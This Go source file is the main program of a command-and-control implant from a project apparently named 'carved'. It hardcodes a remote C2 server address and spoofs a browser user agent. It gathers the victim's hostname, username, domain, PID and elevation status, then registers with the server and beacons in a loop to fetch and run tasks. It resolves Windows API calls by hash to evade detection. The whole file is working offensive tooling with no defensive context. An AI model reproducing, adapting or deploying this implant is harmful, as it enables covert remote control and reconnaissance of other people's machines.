package main

import (
	"fmt"
	"os"
	"runtime"
	"time"
	"unsafe"

	"github.com/google/uuid"

	"github.com/carved4/carved/implant/pkg/tasks"
	"github.com/carved4/carved/implant/pkg/transport"
	"github.com/carved4/carved/shared/proto"
	wc "github.com/carved4/go-wincall"
)

var (
	ServerURL	= "http://45.32.6.69:8443/"
	Sleep		= uint32(5)
	Jitter		= uint8(10)
)

func main() {

	implantID := uuid.New().String()

	fmt.Printf("[*] Implant starting, ID: %s\n", implantID[:8])
	fmt.Printf("[*] Server: %s\n", ServerURL)

	meta := gatherMeta(implantID)

	cfg := &transport.Config{
		ServerURL:	ServerURL,
		Sleep:		Sleep,
		Jitter:		Jitter,
		UserAgent:	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	}

	tasks.Config.Sleep = &cfg.Sleep
	tasks.Config.Jitter = &cfg.Jitter
	tasks.Config.ServerURL = ServerURL

	t := transport.NewHTTPTransport(cfg, implantID)

	fmt.Println("[*] Attempting to register...")
	for {
		err := t.Register(meta)
		if err == nil {
			fmt.Println("[+] Registered successfully!")
			break
		}
		fmt.Printf("[-] Register failed: %v, retrying...\n", err)
		time.Sleep(t.Sleep())
	}

	var pendingResults []*proto.TaskResult

	for {

		newTasks, err := t.Beacon(pendingResults)
		if err != nil {
			fmt.Printf("[-] Beacon error: %v\n", err)
		} else {
			if len(pendingResults) > 0 {
				fmt.Printf("[+] Sent %d results to server\n", len(pendingResults))
			}
			pendingResults = nil

			if len(newTasks) > 0 {
				fmt.Printf("[+] Received %d tasks\n", len(newTasks))
			}
			for _, task := range newTasks {
				fmt.Printf("[*] Executing task: %s (%s)\n", task.Type, task.ID[:8])
				result := tasks.Execute(task)
				if result != nil {
					fmt.Printf("[+] Task completed: %s (status: %s)\n", task.ID[:8], result.Status)
					pendingResults = append(pendingResults, result)
				}
			}
		}

		time.Sleep(t.Sleep())
	}
}

func gatherMeta(implantID string) *proto.ImplantMeta {
	hostname, _ := os.Hostname()
	username := getUsername()
	domain := getDomain()
	elevated := isElevated()
	pid := uint32(os.Getpid())
	process := getProcessName()

	return &proto.ImplantMeta{
		ID:		implantID,
		Hostname:	hostname,
		Username:	username,
		Domain:		domain,
		OS:		runtime.GOOS,
		Arch:		runtime.GOARCH,
		PID:		pid,
		Process:	process,
		Elevated:	elevated,
		FirstSeen:	time.Now(),
		LastSeen:	time.Now(),
		Sleep:		Sleep,
		Jitter:		Jitter,
	}
}

func getUsername() string {

	k32 := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	advapi32 := wc.LoadLibraryLdr("advapi32.dll")
	getUserNameW := wc.GetFunctionAddress(advapi32, wc.GetHash("GetUserNameW"))

	buf := make([]uint16, 256)
	size := uint32(256)

	ret, _, _ := wc.CallG0(getUserNameW, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	if ret != 0 {
		return wc.UTF16ToString(&buf[0])
	}
	_ = k32
	return os.Getenv("USERNAME")
}

func getDomain() string {

	if domain := os.Getenv("USERDOMAIN"); domain != "" {
		return domain
	}
	return os.Getenv("COMPUTERNAME")
}

func isElevated() bool {

	advapi32 := wc.LoadLibraryLdr("advapi32.dll")
	openProcessToken := wc.GetFunctionAddress(advapi32, wc.GetHash("OpenProcessToken"))
	getTokenInformation := wc.GetFunctionAddress(advapi32, wc.GetHash("GetTokenInformation"))

	k32 := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	getCurrentProcess := wc.GetFunctionAddress(k32, wc.GetHash("GetCurrentProcess"))
	closeHandle := wc.GetFunctionAddress(k32, wc.GetHash("CloseHandle"))

	hProcess, _, _ := wc.CallG0(getCurrentProcess)

	var hToken uintptr
	ret, _, _ := wc.CallG0(openProcessToken, hProcess, 0x0008, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return false
	}
	defer wc.CallG0(closeHandle, hToken)

	var elevation uint32
	var returnLength uint32
	ret, _, _ = wc.CallG0(getTokenInformation, hToken, 20, uintptr(unsafe.Pointer(&elevation)), 4, uintptr(unsafe.Pointer(&returnLength)))
	if ret == 0 {
		return false
	}

	return elevation != 0
}

func getProcessName() string {
	path, err := os.Executable()
	if err != nil {
		return "unknown"
	}

	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '\\' || path[i] == '/' {
			return path[i+1:]
		}
	}
	return path
}

